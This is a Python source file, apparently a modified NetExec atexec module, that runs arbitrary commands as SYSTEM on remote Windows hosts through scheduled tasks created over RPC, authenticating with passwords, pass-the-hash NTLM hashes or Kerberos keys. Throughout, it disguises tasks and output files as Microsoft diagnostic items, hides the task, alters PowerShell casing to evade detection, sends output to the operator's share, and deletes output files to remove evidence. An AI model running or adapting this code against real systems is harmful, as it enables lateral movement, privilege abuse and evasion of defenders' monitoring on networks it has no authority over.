import os
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from nxc.helpers.misc import gen_random_string
from time import sleep
from datetime import datetime, timedelta
import contextlib


class TSCH_EXEC:
    def __init__(self, target, share_name, username, password, domain, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ""
        self.__nthash = ""
        self.__outputBuffer = b""
        self.__retOutput = False
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__remoteHost = remoteHost
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.__output_filename = None
        self.__share = share
        self.logger = logger

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = r"ncacn_np:%s[\pipe\atsvc]" % self.__target
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.setRemoteHost(self.__remoteHost)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    def get_end_boundary(self):
        # Get current date and time + 5 minutes
        end_boundary = datetime.now() + timedelta(minutes=5)

        # Format it to match the format in the XML: "YYYY-MM-DDTHH:MM:SS.ssssss"
        return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]

    def gen_xml(self, command, fileless=False):
        
        safer_command = command
        
        if "powershell" in command.lower() and ("-command" in command.lower() or "-c " in command.lower()):
            self.logger.debug("PowerShell command detected, keeping as is (user requested)")
            
            # case randomization
            safer_command = command.replace("powershell", "poWerSheLL")
            safer_command = safer_command.replace("POWERSHELL", "PoWeRsHeLL")
            
        valid_system_filename_prefixes = [
            "DiagTrack-", "CompatTel-", "WindowsUpdate-", "NetTrace-", 
            "Defender-", "SIH-", "WER-", "Cluster-", "ws_trace-"
        ]
        import random
        
        # Create a filename that looks like a legitimate Windows log or temp file
        system_prefix = random.choice(valid_system_filename_prefixes)
        random_date = datetime.now().strftime("%Y%m%d")
        random_suffix = gen_random_string(4)
        
        legit_filename = f"{system_prefix}{random_date}-{random_suffix}.log"

        # get time boundaries
        current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
        
        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{current_time}</Date>
    <Author>Microsoft Corporation</Author>
    <Description>Diagnostics logging helper task</Description>
  </RegistrationInfo>
  <Triggers>
    <RegistrationTrigger>
      <StartBoundary>{current_time}</StartBoundary>
      <EndBoundary>{self.get_end_boundary()}</EndBoundary>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
"""
        if self.__retOutput:
            if "systemroot" not in legit_filename.lower():
                self.__output_filename = f"\\Windows\\Temp\\{legit_filename}"
            else:
                self.__output_filename = f"\\Windows\\Temp\\{gen_random_string(8)}.log"
            
            if fileless:
                local_ip = self.__rpctransport.get_socket().getsockname()[0]
                argument_xml = f"      <Arguments>/C {safer_command} &gt; \\\\{local_ip}\\{self.__share_name}\\{legit_filename} 2&gt;&amp;1</Arguments>"
            else:
                argument_xml = f"      <Arguments>/C {safer_command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"
                
            xml += argument_xml
        else:
            argument_xml = f"      <Arguments>/C {safer_command}</Arguments>"
            xml += argument_xml

        xml += """
    </Exec>
  </Actions>
</Task>
"""
        return xml

    def execute_handler(self, command, fileless=False):
        dce = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        dce.set_credentials(*self.__rpctransport.get_credentials())
        
        try:
            dce.connect()
        except Exception as e:
            self.logger.fail(f"Failed to connect to DCE/RPC service: {e!s}")
            return

        import random
        
        legit_task_prefixes = [
            "Microsoft-Windows-", "Microsoft-Diagnosis-", "Microsoft-Windows-Defender-",
            "SystemRestore-", "WindowsUpdate-", "User-Feed-", "Power-Efficiency-", 
            "Microsoft-Proxy-", "NetworkDiag-", "Office-Background-"
        ]
        
        task_prefix = random.choice(legit_task_prefixes)
        component = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(8))
        
        # Format looks like: Microsoft-Windows-Task-AF73B829
        tmpName = f"{task_prefix}Task-{component}"
        
        # Log the name but don't show it's specially crafted
        self.logger.debug(f"Using task name: {tmpName}")

        xml = self.gen_xml(command, fileless)

        self.logger.debug(f"Task XML: {xml}")
        self.logger.info(f"Creating task \\{tmpName}")
        
        try:
            # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        except Exception as e:
            if hasattr(e, "error_code") and e.error_code and hex(e.error_code) == "0x80070005":
                self.logger.fail("ATEXEC: Create schedule task got blocked.")
            else:
                self.logger.fail(str(e))
            
            # Clean disconnect
            with contextlib.suppress(Exception):
                dce.disconnect()
            return

        # After task creation, try to run it immediately
        try:
            self.logger.debug("Attempting to run the task immediately")
            tsch.hSchRpcRun(dce, f"\\{tmpName}", NULL)
            self.logger.debug("Task run request sent successfully")
        except Exception as e:
            self.logger.debug(f"Could not run task immediately: {e!s}. Will rely on trigger")
            

        # Wait for task execution
        wait_attempts = 0
        done = False
        task_ran = False
        
        sleep(3)
        
        while not done and wait_attempts < 15:
            try:
                self.logger.debug(f"Checking if task \\{tmpName} has run (attempt {wait_attempts + 1}/15)")
                resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{tmpName}")
                if resp["pLastRuntime"]["wYear"] != 0:
                    self.logger.debug(f"Task \\{tmpName} has run")
                    done = True
                    task_ran = True
                else:
                    self.logger.debug(f"Task \\{tmpName} has not run yet, waiting...")
                    wait_attempts += 1
                    sleep(2)
            except Exception as e:
                if "SCHED_S_TASK_HAS_NOT_RUN" in str(e):
                    self.logger.debug("Task has not run yet (expected status), continuing to wait")
                else:
                    self.logger.debug(f"Error checking task: {e!s}")
                
                wait_attempts += 1
                sleep(2)
                
                if wait_attempts >= 7 and self.__retOutput:
                    try:
                        self.logger.debug("Attempting early output file check")
                        smbConnection = self.__rpctransport.get_smb_connection()
                        smbConnection.getFile(self.__share, self.__output_filename, self.output_callback)
                        self.logger.debug("Found output file, task must have completed")
                        done = True
                        task_ran = True
                        break
                    except Exception:
                        pass

        try:
            self.logger.info(f"Deleting task \\{tmpName}")
            tsch.hSchRpcDelete(dce, f"\\{tmpName}")
        except Exception as e:
            self.logger.debug(f"Error deleting task: {e!s}")

        if not task_ran and self.__retOutput:
            self.logger.debug("Waiting additional time for command execution to complete")
            sleep(3)

        if self.__retOutput:
            if fileless:
                # For fileless execution, read from the network share
                max_attempts = 15
                attempts = 0
                while attempts < max_attempts:
                    try:
                        file_path = os.path.join("/tmp", "nxc_hosted", os.path.basename(self.__output_filename))
                        self.logger.debug(f"Looking for fileless output at: {file_path}")
                        with open(file_path) as output:
                            self.output_callback(output.read())
                        
                        # cleanup
                        try:
                            os.remove(file_path)
                            self.logger.debug(f"Removed fileless output file: {file_path}")
                        except OSError as e:
                            self.logger.debug(f"Could not remove file {file_path}: {e}")
                        break
                    except OSError:
                        sleep(2)
                        attempts += 1
            else:
                smbConnection = self.__rpctransport.get_smb_connection()

                tries = 1
                sleep(1)
                
                output_basename = os.path.basename(self.__output_filename)
                os.path.dirname(self.__output_filename.strip("\\"))
                
                # The __output_filename has the form "\Windows\Temp\filename.log"
                # For SMB access, we need "Windows\Temp\filename.log" relative to the share
                smb_relative_path = self.__output_filename.strip("\\")
                
                while True:
                    try:
                        self.logger.info(f"Attempting to read output from {output_basename}")
                        smbConnection.getFile(self.__share, smb_relative_path, self.output_callback)
                        break
                    except Exception as e:
                        if tries >= self.__tries:
                            self.logger.fail("ATEXEC: Could not retrieve output file. It may have been detected by AV, or the task did not execute successfully.")
                            break
                        if "STATUS_BAD_NETWORK_NAME" in str(e):
                            self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                            break
                        elif "STATUS_VIRUS_INFECTED" in str(e):
                            self.logger.fail("Command did not run because a virus was detected")
                            break
                        
                        # When executing powershell and the command is still running, we get a sharing violation
                        if "STATUS_SHARING_VIOLATION" in str(e):
                            self.logger.info(f"File {output_basename} is still in use, retrying...")
                            tries += 1
                            sleep(1)
                        elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                            self.logger.info(f"File {output_basename} not found, retrying...")
                            tries += 2  # Increment by 2 instead of 10 to avoid exhausting tries too quickly
                            sleep(1)
                        else:
                            self.logger.debug(f"Error reading output file: {e!s}. Retrying...")
                            tries += 1
                            sleep(1)

                # Delete the file to remove evidence, but only if we successfully read it
                if tries < self.__tries:
                    try:
                        self.logger.debug(f"Cleaning up output file {output_basename}")
                        smbConnection.deleteFile(self.__share, smb_relative_path)
                    except Exception as e:
                        self.logger.debug(f"Could not delete output file: {e!s}")

        # Always ensure proper disconnect
        with contextlib.suppress(Exception):
            dce.disconnect()
